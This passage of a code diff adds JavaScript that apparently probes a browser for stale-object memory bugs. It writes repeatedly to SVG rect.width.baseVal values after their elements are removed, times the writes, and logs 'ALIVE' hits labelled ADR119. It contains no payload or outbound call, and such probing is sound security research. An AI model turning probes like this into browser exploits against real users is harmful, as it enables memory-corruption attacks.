+    var tWstale=timeWrite(function(i){W_bv.value=i+77777;},'ADR119: W_bv stale write after rect remove',500);
+    if(tWstale>0.5){
+      L('★★★ ADR119: W_bv (rect.width.baseVal) ALIVE after rect remove!','hit');
+    } else {
+      L('ADR119: W_bv dead after rect remove','info');
+    }
+
+    // Remove svg2 entirely
+    svg2.remove();
+    var tWstale2=timeWrite(function(i){W_bv.value=i+88888;},'ADR119: W_bv stale write after svg2 remove',500);
+    if(tWstale2>0.5){
+      L('★★★ ADR119: W_bv ALIVE after svg2 remove!','hit');
+    } else {
+      L('ADR119: W_bv dead after svg2 remove','info');
+    }
+
+    // Read back values
+    L('ADR119: W_bv.value after all stale writes='+W_bv.value,'info');
+    L('ADR119: R_bv.x after all stale writes='+R_bv.x,'info');
+    L('ADR119: done.','info');
+  });
 };
 </script>
 </body>
